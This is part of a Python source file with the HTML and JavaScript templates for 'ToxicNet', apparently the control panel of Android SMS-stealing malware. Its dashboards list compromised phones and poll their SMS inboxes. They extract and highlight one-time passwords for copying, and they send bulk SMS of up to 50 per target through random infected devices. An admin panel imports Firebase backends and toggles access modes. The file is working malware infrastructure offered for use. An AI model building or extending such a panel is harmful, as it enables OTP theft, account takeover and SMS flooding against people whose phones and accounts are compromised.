.sms-time{font-size:12px;color:#94a3b8;font-weight:500}
.sms-body{font-size:15px;color:#cbd5e1;line-height:1.6;word-break:break-word;white-space:pre-wrap}
.otp-highlight{background:rgba(139,92,246,.2);color:#a78bfa;padding:2px 8px;border-radius:6px;font-weight:700}
.otp-copy-btn{margin-top:14px;padding:10px 16px;border-radius:10px;background:#334155;color:#f1f5f9;font-size:13px;font-weight:600;display:inline-flex;align-items:center;gap:8px;transition:.2s}
.otp-copy-btn:hover{background:#475569}
.empty{text-align:center;padding:60px 20px;color:#94a3b8;font-size:14px}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;backdrop-filter:blur(4px)}
.modal-overlay.show{display:flex;animation:fadeIn 0.2s ease}
.modal-content{background:#1e293b;border:1px solid #334155;border-radius:24px;padding:24px;width:100%;max-width:400px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.3s ease}
.modal-content h3{font-size:20px;font-weight:800;margin-bottom:8px}
.modal-content p{font-size:13px;color:#94a3b8;margin-bottom:20px}
.modal-content input,.modal-content textarea{width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;margin-bottom:12px}
.modal-btns{display:flex;gap:10px;margin-top:16px}
.modal-btns button{flex:1;padding:14px;border-radius:12px;font-weight:700}
.sec-card{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:20px;animation:slideUp 0.4s ease}
.sec-card h3{font-size:16px;color:#f1f5f9;margin-bottom:8px;font-weight:700;display:flex;align-items:center;gap:8px}
.sec-card p.desc{font-size:13px;color:#94a3b8;margin-bottom:20px;line-height:1.5}
.status-display{background:#0f172a;border:1px solid #334155;border-radius:14px;padding:20px;margin-bottom:20px;display:flex;align-items:center;gap:16px}
.status-display .status-icon{font-size:32px}
.status-display .status-label{font-size:11px;color:#94a3b8;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
.status-display .status-value{font-size:20px;font-weight:800}
.status-display.active{border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
.status-display.active .status-value{color:#10b981}
.status-display.inactive{border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.05)}
.status-display.inactive .status-value{color:#ef4444}
.status-display.pwdless{border-color:rgba(59,130,246,.3);background:rgba(59,130,246,.05)}
.status-display.pwdless .status-value{color:#3b82f6}
.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
.btn-row button{padding:14px;border-radius:12px;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px}
.field label{display:block;font-size:12px;color:#94a3b8;font-weight:600;margin-bottom:8px}
.pwd-wrap-sec{position:relative}
.pwd-wrap-sec input{width:100%;padding:14px 44px 14px 14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9}
.toggle-pwd-sec{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;color:#64748b}
.fb-card-list{background:#1e293b;border-radius:20px;padding:24px;margin-bottom:20px;border:1px solid #334155}
.add-row{display:flex;gap:10px;flex-wrap:wrap}
.add-row input{flex:1;min-width:200px;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9}
.add-row input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.1)}
.fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
.fb-header h2{font-size:18px;font-weight:700;display:flex;align-items:center;gap:10px}
.fb-card{background:#0f172a;border:1px solid #334155;border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;margin-bottom:12px;transition:.2s}
.fb-card:hover{border-color:#475569}
.fb-icon{width:44px;height:44px;border-radius:12px;background:rgba(245,158,11,.1);color:#f59e0b;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.fb-info{flex:1;min-width:0}
.fb-name{font-size:15px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.fb-hash{font-size:11px;color:#94a3b8;margin-bottom:8px}
.fb-counts{display:flex;gap:6px;flex-wrap:wrap}
.checkbox{width:24px;height:24px;border:2px solid #475569;border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:.2s;color:transparent;font-size:14px;font-weight:800}
.checkbox.checked{background:#f59e0b;border-color:#f59e0b;color:#fff}
.log-card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;margin-bottom:14px;animation:slideUp 0.3s ease}
.log-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
.log-target{font-size:16px;font-weight:700;color:#3b82f6}
.log-time{font-size:12px;color:#94a3b8;font-weight:500}
.log-msg{font-size:14px;color:#cbd5e1;background:#0f172a;padding:14px;border-radius:12px;border:1px solid #334155;margin-bottom:12px;line-height:1.5;word-break:break-word}
.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:11px;font-weight:600;color:#94a3b8}
.log-meta span{background:#334155;padding:4px 10px;border-radius:8px;display:flex;align-items:center;gap:4px}
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;background:#0f172a}
.login-box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:36px 28px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.5s ease}
.login-box.admin{border-color:#ef4444;box-shadow:0 25px 50px -12px rgba(239,68,68,.3)}
.login-box .logo{text-align:center;margin-bottom:24px}
.login-box .logo-icon{font-size:48px;margin-bottom:12px;display:block}
.login-box h1{text-align:center;font-size:20px;margin-bottom:6px;font-weight:800}
.login-box.admin h1{background:linear-gradient(135deg,#ef4444,#f59e0b);-webkit-background-clip:text;background-clip:text;color:transparent}
.login-box p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:32px;font-weight:500}
.login-box .pwd-wrap{position:relative}
.login-box input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#f1f5f9;font-weight:500}
.login-box input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.15)}
.login-box.admin input:focus{border-color:#ef4444;box-shadow:0 0 0 4px rgba(239,68,68,.15)}
.login-box button{width:100%;margin-top:20px;padding:16px;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px}
.login-box.admin button{background:linear-gradient(135deg,#ef4444,#f59e0b)}
.login-box .info{margin-top:24px;text-align:center;font-size:12px;color:#64748b;font-weight:500}
.toggle-pwd{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#64748b;padding:4px}
.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px;font-weight:600}
"""

# ════════════════════════════════════════════════════════════
# LOGIN PAGES
# ════════════════════════════════════════════════════════════
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>ToxicNet — Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body>
<div class="login-wrap"><form class="login-box" method="POST">
<div class="logo"><span class="logo-icon">☣️</span></div>
<h1>ToxicNet</h1><p class="sub">Enter password to continue</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Password" required autofocus>
<span class="toggle-pwd" onclick="tp(event)">👁</span>
</div>
<button type="submit">Login</button>
__ERROR__
<div class="info">Protected System</div>
</form></div>
<script>function tp(e){var i=document.getElementById('pwd');var t=e.target;if(i.type==='password'){i.type='text';t.textContent='🙈';}else{i.type='password';t.textContent='👁';}}</script>
</body></html>"""


ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>ToxicNet — SuperMasterAdmin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body>
<div class="login-wrap"><form class="login-box admin" method="POST">
<div class="logo"><span class="logo-icon">🔐</span></div>
<h1>SUPER MASTER ADMIN</h1><p class="sub">Root Access Level 99</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Admin Key" required autofocus>
<span class="toggle-pwd" onclick="tp(event)">👁</span>
</div>
<button type="submit">Authenticate</button>
__ERROR__
<div class="info">Protected System</div>
</form></div>
<script>function tp(e){var i=document.getElementById('pwd');var t=e.target;if(i.type==='password'){i.type='text';t.textContent='🙈';}else{i.type='password';t.textContent='👁';}}</script>
</body></html>"""

# ════════════════════════════════════════════════════════════
# USER DASHBOARD
# ════════════════════════════════════════════════════════════
USER_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>ToxicNet</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body class="app">

<div class="topbar">
<div class="brand">☣️ Toxic<span>Net</span></div>
<div class="top-actions">
<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()">⟳</button>
<div class="conn online" id="conn-badge"><span class="dot"></span><span id="conn-text">Live</span></div>
<a href="/logout" style="padding:8px 12px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:12px;font-weight:600">Logout</a>
</div>
</div>

<div class="nav">
<div class="nav-link active" id="tab-num" onclick="switchTab('num')">📱 Numbers</div>
<div class="nav-link" id="tab-sms" onclick="switchTab('sms')">💣 SMS Sender</div>
<a href="/otp" class="nav-link">🔑 Personal OTP</a>
</div>

<div class="container">
<div id="view-num">
<div class="session-banner" id="pwless-banner" style="display:none"><span class="pulse-dot"></span>🔓 Passwordless Mode · Access Granted</div>

<div id="list-view">
<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp">
<div class="label" style="margin-bottom:2px">OTP Rate</div>
<svg viewBox="0 0 36 36" class="circular-chart">
<path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<path class="circle" id="otp-circle" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<text x="18" y="18" class="otp-text" id="s-otp">0%</text>
</svg>
</div>
</div>

<div class="filter-bar">
<button class="filter-btn active" id="filter-all" onclick="setFilter('all')">All</button>
<button class="filter-btn online-filter" id="filter-online" onclick="setFilter('online')">🟢 Online</button>
<button class="filter-btn offline-filter" id="filter-offline" onclick="setFilter('offline')">🔴 Offline</button>
</div>

<div class="search-box">
<input id="search-num" placeholder="Search number or device..." oninput="renderNumbers()">
</div>

<div id="list-content">
<div class="list-header">
<h2>Numbers</h2>
<span class="count" id="num-count">0</span>
</div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<button class="back-btn" onclick="backToList()">←</button>
<div style="flex:1">
<div class="inbox-num" id="inbox-num">---</div>
<div class="inbox-status"><span class="pulse-dot"></span> <span id="inbox-status-text">Online</span></div>
</div>
<button class="icon-btn" onclick="loadInbox(true)">⟳</button>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="view-sms" class="hidden">
<div class="sms-sender-box">
<h2>💣 SMS Sender</h2>
<div class="warning-box">
⚠️ <b>Important:</b> Ye feature sirf un devices pe kaam karta hai jinke firmware me <code>/commands/</code> handler implement hai.
</div>
<p id="online-dev-text">Loading device info...</p>

<div class="form-group">
<label>Enter Number (Target)</label>
<input type="tel" id="sms-target" placeholder="+91 9876543210">
</div>
<div class="form-group">
<label>Enter Message</label>
<textarea id="sms-message" placeholder="Type your message here..."></textarea>
</div>
<div class="form-group">
<label>Kitna bar send karna hai? (Max 50)</label>
<input type="number" id="sms-count" value="1" min="1" max="50">
</div>
<button class="btn btn-primary" id="bulk-send-btn" onclick="sendSms(this)">🚀 Send Message</button>
</div>
</div>
</div>

<div class="modal-overlay" id="sms-modal">
<div class="modal-content">
<h3>📩 Send Message</h3>
<p>Target Number:</p>
<div class="form-group" style="margin-bottom:12px;">
<input type="tel" id="modal-target-input" placeholder="+91 9876543210" style="margin-bottom:0;background:#1e293b;border:1.5px solid #3b82f6;">
</div>
<textarea id="modal-message" placeholder="Type your message here..." style="min-height:120px;width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;"></textarea>
<div class="modal-btns">
<button class="btn-gray" onclick="closeModal()">Cancel</button>
<button class="btn-primary" id="modal-send-btn" onclick="confirmSingleSend(this)">Send Now</button>
</div>
</div>
</div>

<div class="modal-overlay" id="status-modal">
<div class="modal-content" style="text-align:center">
<div id="status-icon" style="font-size:48px;margin-bottom:12px">✅</div>
<h3 id="status-title" style="margin-bottom:8px;color:#10b981;">Success!</h3>
<p id="status-desc" style="margin-bottom:24px;font-size:14px;color:#cbd5e1">Message sent successfully.</p>
<button class="btn btn-primary" onclick="document.getElementById('status-modal').classList.remove('show')">Tutup</button>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [];
let numbers = [];
let currentFilter = 'all';
let currentNum = null;
let allInboxMsgs = [];
let refreshTimer = null;
let lastSig = '';
let lastInboxSig = '';
let autoKicked = false;
let pwlessMode = false;

const $ = id => document.getElementById(id);
function toast(text){ const t=$('toast'); t.textContent=text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2500); }
function escapeHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
function fmtTime(ts){ if(!ts) return ''; try{ let t=parseInt(ts); if(t>1e12)t=Math.floor(t/1000); if(t<1e9)return String(ts); const d=new Date(t*1000); return d.toLocaleString('en-IN',{timeZone:'Asia/Kolkata',hour12:true,day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}); }catch(e){return String(ts);} }

function switchTab(tab){
  ['num','sms'].forEach(t=>{ $('view-'+t).classList.add('hidden'); $('tab-'+t).classList.remove('active'); });
  $('view-'+tab).classList.remove('hidden');
  $('tab-'+tab).classList.add('active');
  if(tab==='sms') updateSenderUI();
}

function setFilter(f){
  currentFilter = f;
  ['all','online','offline'].forEach(x=>$('filter-'+x).classList.remove('active'));
  $('filter-'+f).classList.add('active');
  renderNumbers();
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn'); const d = await r.json();
    const badge = $('conn-badge'); const txt = $('conn-text');
    if(d.mongo_connected){ badge.className='conn online'; txt.textContent='Live'; }
    else { badge.className='conn'; txt.textContent='Off'; }
  }catch(e){}
}

async function checkPwdless(){
  try{
    const r = await fetch('/api/panel/state'); const d = await r.json();
    pwlessMode = d.state === 'pwdless';
    if(pwlessMode) $('pwless-banner').style.display='flex';
  }catch(e){}
}

async function loadNumbers(){
  try{
    const r = await fetch('/api/numbers'); const d = await r.json();
    if(!d.success) return;
    allNumbers = d.numbers || [];
    if(allNumbers.length===0 && d.firebases_total>0 && !autoKicked){
      autoKicked = true;
      toast('🔄 First load — fetching data...');
      fetch('/api/refresh',{method:'POST'}).finally(()=>{
        setTimeout(()=>{ autoKicked=false; loadNumbers(); }, 1000);
      });
      return;
    }
    const total = allNumbers.length;
    const online = allNumbers.filter(n=>n.online).length;
    const offline = total - online;
    const totalOtp = allNumbers.reduce((s,n)=>s+n.otp_count,0);
    const totalMsg = allNumbers.reduce((s,n)=>s+n.msg_count,0);
    const otpRate = totalMsg>0 ? Math.floor((totalOtp/totalMsg)*100) : 0;

    $('s-total').textContent = total;
    $('s-online').textContent = online;
    $('s-offline').textContent = offline;
    $('s-otp').textContent = otpRate + '%';
    $('otp-circle').setAttribute('stroke-dasharray', otpRate + ', 100');
    const sig = total+'|'+online+'|'+otpRate+'|'+currentFilter;
    if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
    updateSenderUI();
  }catch(e){}
}

function renderNumbers(){
  const q = ($('search-num').value||'').toLowerCase();
  const box = $('num-list');
  let filtered = allNumbers;
  if(currentFilter==='online') filtered = filtered.filter(n=>n.online===true);
  if(currentFilter==='offline') filtered = filtered.filter(n=>n.online!==true);
  if(q) filtered = filtered.filter(n=>(n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
  $('num-count').textContent = filtered.length;
  if(filtered.length===0){ box.innerHTML='<div class="empty">No numbers found</div>'; return; }
  numbers = filtered;
  box.innerHTML = filtered.map((n,i)=>{
    const isOnline = n.online===true;
    const isUnknown = (n.number||'').startsWith('UNKNOWN-');
    const iconCls = isUnknown?'unknown-icon':(isOnline?'':'offline-icon');
    const badgeCls = isOnline?'online':'offline';
    const iconEmoji = isUnknown?'❓':(isOnline?'📱':'📴');
    return '<div class="num-card">'
      + '<div class="num-icon '+iconCls+'">'+iconEmoji+'</div>'
      + '<div class="num-info" onclick="openInbox('+i+')">'
      + '<div class="num-title '+(isUnknown?'unknown':'')+'">'+escapeHtml(n.number)+'</div>'
      + '<div class="num-sub">'
      + '<span class="pill">✉️ '+n.msg_count+' SMS</span>'
      + (n.otp_count>0?'<span class="pill otp">🔑 '+n.otp_count+' OTP</span>':'')
      + '</div></div>'
      + '<div class="card-actions"><button class="icon-btn send-btn" onclick="event.stopPropagation();openSendModal(\''+escapeHtml(n.number)+'\')" title="Send SMS">💬</button></div>'
      + '<div class="badge '+badgeCls+'"><span class="dot"></span>'+(isOnline?'Online':'Offline')+'</div>'
      + '</div>';
  }).join('');
}

async function openInbox(idx){
  const n = numbers[idx];
  if(!n) return;
  currentNum = n;
  lastInboxSig = '';
  $('list-view').classList.add('hidden');
  $('inbox-view').classList.remove('hidden');
  $('inbox-num').textContent = n.number;
  $('inbox-status-text').textContent = n.online?'Online':'Offline';
  $('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 2000);
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader) $('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
  const ctrl = new AbortController();
  const tid = setTimeout(()=>ctrl.abort(), 15000);
  try{
    const r = await fetch('/api/inbox?fb='+encodeURIComponent(currentNum.firebase)+'&id='+encodeURIComponent(currentNum.device_id)+'&num='+encodeURIComponent(currentNum.number), {signal:ctrl.signal});
    clearTimeout(tid);
    const d = await r.json();
    if(!d.success){ $('sms-container').innerHTML='<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
    allInboxMsgs = d.messages||[];
    const sig = allInboxMsgs.map(m=>(m.timestamp||0)+'|'+(m.message||'').slice(0,40)).join('#');
    if(sig!==lastInboxSig){ lastInboxSig=sig; renderMessages(); }
  }catch(e){ clearTimeout(tid); }
}

function renderMessages(){
  const box = $('sms-container');
  const now = Math.floor(Date.now()/1000);
  const sorted = [...allInboxMsgs].sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,60);
  if(!sorted.length){ box.innerHTML='<div class="empty">📭 No SMS</div>'; return; }
  box.innerHTML = '<div class="sms-list">' + sorted.map(m=>{
    const otp = m.otp || extractOtp(m.message);
    const body = otp ? escapeHtml(m.message).replace(otp,'<span class="otp-highlight">'+otp+'</span>') : escapeHtml(m.message);
    const copyBtn = otp ? '<button class="otp-copy-btn" onclick="copyOtp(\''+otp+'\')">📋 Copy OTP '+otp+'</button>' : '';
    const isFresh = (m.timestamp||0) >= (now-120);
    const ts = m.timestamp||0;
    const timeStr = m.date_string || fmtTime(ts);
    return '<div class="sms-item '+(isFresh?'fresh':'')+'">'
      + '<div class="sms-head"><div class="sender">'+escapeHtml(m.from||'Unknown')+'</div><div class="sms-time">'+escapeHtml(timeStr)+'</div></div>'
      + '<div class="sms-body">'+body+'</div>'
      + copyBtn
      + '</div>';
  }).join('') + '</div>';
}

function backToList(){
  $('inbox-view').classList.add('hidden');
  $('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer=null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
  if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
  if(m) return m[1];
  m = t.match(/#(\d{4,8})/);
  if(m) return m[1];
  return '';
}

function copyOtp(code){
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(()=>toast('✅ COPIED: '+code)).catch(()=>{}); }
  else toast('✅ COPIED: '+code);
}

function manualRefresh(){
  const btn = $('refresh-btn');
  btn.classList.add('spinning');
  toast('🔄 Refreshing...');
  fetch('/api/refresh',{method:'POST'}).then(r=>r.json()).then(d=>{
    if(d.success){ setTimeout(()=>loadNumbers(), 500); toast('✅ Refreshed'); }
    else toast('❌ '+(d.error||'Failed'));
  }).catch(()=>toast('❌ Network error')).finally(()=>setTimeout(()=>btn.classList.remove('spinning'), 1200));
}

function updateSenderUI(){
  const online = allNumbers.filter(n=>n.online===true).length;
  const el = $('online-dev-text');
  if(el) el.innerHTML = '<span style="color:#10b981;font-weight:700">'+online+' Devices Online</span> (Pesan akan dikirim via random online device)';
}

function openSendModal(number){
  const input = $('modal-target-input');
  if(number && !number.startsWith('UNKNOWN-')) input.value = number;
  else input.value = '';
  $('modal-message').value = '';
  $('sms-modal').classList.add('show');
  setTimeout(()=>input.focus(), 100);
}
function closeModal(){ $('sms-modal').classList.remove('show'); }

async function confirmSingleSend(btn){
  const target = $('modal-target-input').value.trim();
  const msg = $('modal-message').value.trim();
  if(!target){ toast('❌ Target required'); return; }
  if(!msg){ toast('❌ Message required'); return; }
  const original = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending...';
  try{
    const r = await fetch('/api/sms/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target, message:msg, count:1})});
    const d = await r.json();
    closeModal();
    if(d.success) showStatusModal(true, 'Berhasil!', 'Terkirim '+d.sent+'/'+d.requested+' ke '+target);
    else showStatusModal(false, 'Gagal', d.error || 'Tidak ada device online');
  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
  finally{ btn.disabled = false; btn.innerHTML = original; }
}

async function sendSms(btn){
  const target = $('sms-target').value.trim();
  const msg = $('sms-message').value.trim();
  const count = parseInt($('sms-count').value) || 1;
  if(!target){ toast('❌ Target required'); return; }
  if(!msg){ toast('❌ Message required'); return; }
  if(count > 50){ toast('❌ Max 50'); return; }
  const original = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending...';
  try{
    const r = await fetch('/api/sms/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target, message:msg, count})});
    const d = await r.json();
    if(d.success){
      showStatusModal(true, 'Berhasil!', 'Terkirim '+d.sent+'/'+d.requested+' pesan ke '+target);
      $('sms-target').value = '';
      $('sms-message').value = '';
      $('sms-count').value = 1;
    } else showStatusModal(false, 'Gagal', d.error || 'Server error');
  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
  finally{ btn.disabled = false; btn.innerHTML = original; }
}

function showStatusModal(isOk, title, desc){
  $('status-icon').textContent = isOk?'✅':'❌';
  $('status-title').textContent = title;
  $('status-title').style.color = isOk?'#10b981':'#ef4444';
  $('status-desc').textContent = desc;
  $('status-modal').classList.add('show');
}

checkConn();
checkPwdless();
loadNumbers();
setInterval(checkConn, 10000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
</script>
</body></html>
"""


# ════════════════════════════════════════════════════════════
# ADMIN DASHBOARD
# ════════════════════════════════════════════════════════════
ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>ToxicNet — SuperMasterAdmin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body class="app">

<div class="topbar">
<div class="brand">☣️ Toxic<span>Net</span><span style="font-size:10px;background:linear-gradient(135deg,#ef4444,#f59e0b);color:#fff;padding:4px 8px;border-radius:6px;margin-left:8px;font-weight:800;letter-spacing:0.5px">ROOT</span></div>
<div class="top-actions">
<button class="refresh-btn" onclick="manualRefresh()">⟳</button>
<div class="conn online" id="conn-badge"><span class="dot"></span><span id="conn-text">Live</span></div>
<a href="/logout" style="padding:8px 12px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:12px;font-weight:600">Logout</a>
</div>
</div>

<div class="nav">
<div class="nav-link active" id="atab-dash" onclick="adminSwitch('dash')">📱 Numbers</div>
<div class="nav-link" id="atab-fb" onclick="adminSwitch('fb')">🔥 Firebases</div>
<div class="nav-link" id="atab-logs" onclick="adminSwitch('logs')">📜 SMS Logs</div>
<div class="nav-link" id="atab-sec" onclick="adminSwitch('sec')">🔒 Security</div>
</div>

<div class="container">
<div id="aview-dash">
<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="a-s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="a-s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="a-s-offline">0</div></div>
<div class="stat otp">
<div class="label" style="margin-bottom:2px">OTP Rate</div>
<svg viewBox="0 0 36 36" class="circular-chart">
<path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<path class="circle" id="a-otp-circle" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
<text x="18" y="18" class="otp-text" id="a-s-otp">0%</text>
</svg>
</div>
</div>
<div class="list-header">
<h2>Numbers <span class="count" id="a-num-count" style="margin-left:8px">0</span></h2>
<div style="font-size:12px;font-weight:600;color:#f59e0b">🔥 FB: <span id="q-fb">0</span></div>
</div>
<div id="a-num-list"></div>
</div>

<div id="aview-fb" class="hidden">
<div class="fb-card-list">
<h3 style="font-size:16px;font-weight:700;margin-bottom:16px">➕ Add Firebase URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx.firebaseio.com" type="url">
<button class="btn primary" onclick="addFirebase()" style="max-width:100px">Add</button>
<button class="btn gray" onclick="toggleBulk()" style="max-width:100px">Bulk</button>
</div>
<div id="bulk-area" class="hidden" style="margin-top:12px">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo" style="width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-family:monospace;min-height:120px"></textarea>
<button class="btn primary" onclick="bulkAdd()" style="margin-top:8px;max-width:160px">📥 Import All</button>
</div>
<div id="fb-msg" style="margin-top:10px;font-size:13px;font-weight:600"></div>
</div>
<div class="fb-header">
<h2>All Firebases <span class="count" id="fb-count" style="background:rgba(245,158,11,.1);color:#f59e0b">0</span></h2>
<div style="display:flex;gap:8px">
<button class="btn gray" onclick="removeSelected()" style="padding:8px 12px;font-size:12px;width:auto">🗑 Sel</button>
<button class="btn gray" onclick="removeAll()" style="padding:8px 12px;font-size:12px;color:#ef4444;width:auto">🗑 All</button>
</div>
</div>
<div id="fb-list"></div>
</div>

<div id="aview-logs" class="hidden">
<div class="list-header"><h2>📜 SMS Logs</h2><span class="count" id="log-count">0</span></div>
<div id="logs-container"></div>
</div>

<div id="aview-sec" class="hidden">
<div class="sec-card">
<h3>⚡ User Panel Control</h3>
<p class="desc">Manage panel status and access modes.</p>
<div id="panel-status-display" class="status-display active">
<div class="status-icon">🟢</div>
<div><div class="status-label">Panel Status</div><div class="status-value" id="panel-status-val">ACTIVE</div></div>
</div>
<div style="font-size:11px;font-weight:700;color:#94a3b8;margin-bottom:8px">QUICK TOGGLE</div>
<div class="btn-row">
<button class="btn green" onclick="setPanelState('active')">🟢 Activate</button>
<button class="btn warning" onclick="setPanelState('inactive')">🔴 Deactivate</button>
</div>
<div style="font-size:11px;font-weight:700;color:#94a3b8;margin-bottom:8px">PASSWORDLESS MODE</div>
<div class="btn-row">
<button class="btn green" onclick="setPanelState('pwdless')">🔓 Enable</button>
<button class="btn warning" onclick="setPanelState('active')">🔒 Disable</button>
</div>
</div>

<div class="sec-card">
<h3>💣 SMS Sender Control</h3>
<p class="desc">Toggle SMS Sender. When disabled, users cannot send any SMS.</p>
<div class="btn-row">
<button class="btn green" onclick="setSmsToggle(true)">🟢 Enable</button>
<button class="btn warning" onclick="setSmsToggle(false)">🔴 Disable</button>
</div>
</div>

<div class="sec-card">
<h3>👤 Change User Password</h3>
<div class="field">
<label>New User Password</label>
<div class="pwd-wrap-sec">
<input type="password" id="user-pwd" placeholder="Enter new password">
<span class="toggle-pwd-sec" onclick="tp('user-pwd', event)">👁</span>
</div>
</div>
<button class="btn primary" style="width:100%;margin-top:16px" onclick="changePwd('user')">Update User Password</button>
</div>

<div class="sec-card">
<h3>👑 Change Admin Password</h3>
<div class="field">
<label>New Admin Password</label>
<div class="pwd-wrap-sec">
<input type="password" id="admin-pwd" placeholder="Enter new password">
<span class="toggle-pwd-sec" onclick="tp('admin-pwd', event)">👁</span>
</div>
</div>
<button class="btn primary" style="width:100%;margin-top:16px;background:#3b82f6" onclick="changePwd('admin')">Update Admin Password</button>
</div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [];
